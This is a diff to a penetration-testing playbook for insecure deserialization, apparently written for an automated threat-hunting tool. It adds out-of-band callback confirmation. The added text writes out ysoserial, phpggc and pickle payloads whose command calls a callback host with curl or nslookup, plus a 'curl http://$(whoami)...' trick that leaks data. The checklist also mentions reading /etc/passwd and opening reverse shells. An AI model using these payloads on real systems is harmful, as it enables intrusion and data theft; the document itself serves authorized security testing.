@@ -21,6 +21,8 @@ origin: AI Threat Hunting
 - phpggc (PHP gadget chains — run host-side to generate payloads)
 - Burp Suite (Java Deserialization Scanner extension — use to identify candidate parameters, then deliver confirmed payloads via kali exec)
 - ppickle exploit generator (Python — host-side payload generation)
+- `aith oob mint` / `aith oob poll` (blind gadget-chain confirmation — mint a callback URL, use it as the gadget command, poll for the correlated hit; see "Blind Confirmation via OOB" below — replaces reading the listener log by hand)
+- `aith assess classify-payload <blob> --mutations` (type the serialized blob / tampered field and generate type-confusion + escalation variants — see "Type the Serialized Value" below)
 - Custom scripts for .NET formatters (run via `aith assess kali exec --technique RCE ... -- python3 ...` if target-facing)
 
 ## Methodology
@@ -34,6 +36,19 @@ origin: AI Threat Hunting
 - [ ] Check cookies, ViewState, session storage, message queues, API params
 - [ ] Check `Content-Type`: `application/x-java-serialized-object`, `application/x-php-serialized`
 
+**Type the blob before tampering.** Run the opaque cookie/parameter value through the classifier to confirm its encoding and get type-confusion variants deterministically:
+
+```bash
+aith assess classify-payload "rO0ABXNy..." --mutations    # type: base64 (Java) → format: quoted, null, truncated, "=="-padded
+aith assess classify-payload "admin" --mutations          # the tampered role field (§10) → escalation: root, ADMIN, 0, 1, true
+```
+
+Consume by intent bucket:
+- **`format`** on a `base64`/`hex` blob → `null`, `""`, `[]`, the `==`-repadded and truncated forms — quick probes for "what does the deserializer do with a malformed/absent blob?" (a stack trace here confirms the sink and often leaks the formatter/library).
+- **`escalation`** on the *decoded* tampering target (a `role`/`isAdmin` string field per §10 Data Tampering) → `admin`, `root`, `ADMIN`, `true`, `0`, `1` — drop these into the field before re-serializing for the non-RCE privilege-escalation path.
+
+The gadget chains themselves are byte-structured payloads from ysoserial/phpggc, not value-typed — keep generating those with the tools above. The classifier helps with the *envelope* (encoding) and the *tampered scalar fields*, not the chain bytes.
+
 ### 2. Java Deserialization
 
 - [ ] Generate payloads with ysoserial:
@@ -41,7 +56,7 @@ origin: AI Threat Hunting
 - [ ] Test common gadget chains: CommonsCollections1-7, Spring, Groovy, Hibernate
 - [ ] Identify libraries in classpath from error messages or probing
 - [ ] Test via cookies, POST body, RMI endpoints, JMX, T3 (WebLogic)
-- [ ] Blind: DNS/HTTP callback payload to confirm execution
+- [ ] Blind (the usual case): generate the chain with a minted OOB callback as its command and poll for the hit — see "Blind Confirmation via OOB" in §9
 
 ### 3. PHP Deserialization
 
@@ -63,7 +78,7 @@ origin: AI Threat Hunting
       pickle.dumps(Exploit())
       ```
 - [ ] Test in cookies, session data, API payloads, cached objects
-- [ ] Blind: use DNS/HTTP callback as command
+- [ ] Blind (the usual case): return a minted OOB callback fetch from `__reduce__` and poll for the hit — see "Blind Confirmation via OOB" in §9
 
 ### 5. .NET Deserialization
 
@@ -98,10 +113,40 @@ origin: AI Threat Hunting
 
 ### 9. Impact Validation
 
-- [ ] Confirm code execution with `id`, `whoami`, or DNS callback
+- [ ] Confirm code execution with `id`, `whoami`, or an OOB callback (see "Blind Confirmation via OOB" below — the default channel when output is not reflected)
 - [ ] Read sensitive files
 - [ ] Establish reverse shell if in scope
 - [ ] Check if deserialized data affects application logic (role, permissions)
+
+#### Blind Confirmation via OOB
+
+Deserialization RCE is almost always blind — the gadget executes but stdout never returns to you. Mint a nonce-tagged callback and use it AS the gadget command, then poll for the correlated hit instead of grepping the listener log:
+
+```bash
+aith oob status --json
+aith oob mint --technique deserialization --target-url "https://target/api" --param session --probe-kind dns
+# -> http  http://<prefix>-<token>.researcher.example/
+#    dns   <prefix>-<token>.researcher.example
+```
+
+Feed the minted host as the command when generating the chain, then deliver via the kali exec wrapper:
+
+```bash
+# Java — ysoserial command = the callback fetch
+java -jar ysoserial.jar CommonsCollections1 'curl http://<prefix>-<token>.researcher.example/' | base64
+# Python pickle — __reduce__ returns the callback
+#   return (os.system, ('nslookup <prefix>-<token>.researcher.example',))
+# PHP phpggc
+phpggc Laravel/RCE1 system 'curl http://<prefix>-<token>.researcher.example/'
+```
+
+Correlate:
+
+```bash
+aith oob poll --client <name> --json
+```
+
+A non-empty `matched` array for your nonce confirms blind code execution — each match ties the callback (`protocol`, `remote_address`) to the recorded probe (`technique`, `target_url`), proving *which* gadget chain fired. Exfil one field by prepending it to the host (`curl http://$(whoami).<prefix>-<token>.researcher.example/`) — the value lands as the left label of the matched callback. DNS-only callbacks (use `nslookup`/`dig` gadgets, `--probe-kind dns`) still confirm execution where egress is firewalled to DNS. Empty `matched` after the payload lands → the chain did not execute (wrong gadget/library); rotate chains and record a runtime issue.
 
 ### 10. Data Tampering (Non-RCE)
 
@@ -114,7 +159,7 @@ origin: AI Threat Hunting
 - Endpoint and parameter carrying serialized data
 - Serialization format and language
 - Gadget chain used (if RCE)
-- Proof of execution (command output or callback) — confirming the gadget chain payload was accepted is not enough; you must show the **attacker outcome** (e.g., the CommonsCollections1 payload executed `id` and the OOB DNS callback returned `uid=0(root).attacker.example`, the pickle payload read `/etc/passwd` and its contents were exfiltrated via HTTP callback, the tampered session role field of `admin` was accepted and granted access to the admin dashboard)
+- Proof of execution (command output or callback) — confirming the gadget chain payload was accepted is not enough; you must show the **attacker outcome** (e.g., the CommonsCollections1 payload executed `whoami` and `aith oob poll --client <name>` returned a matched callback whose left label was `root` — proving the chain fired as root; the pickle payload read `/etc/passwd` and its contents were exfiltrated via HTTP callback; the tampered session role field of `admin` was accepted and granted access to the admin dashboard)
 - Libraries enabling the chain
 - Severity: Critical (RCE) or High (data tampering)
 - Remediation: avoid native deserialization, use allowlists, sign serialized data
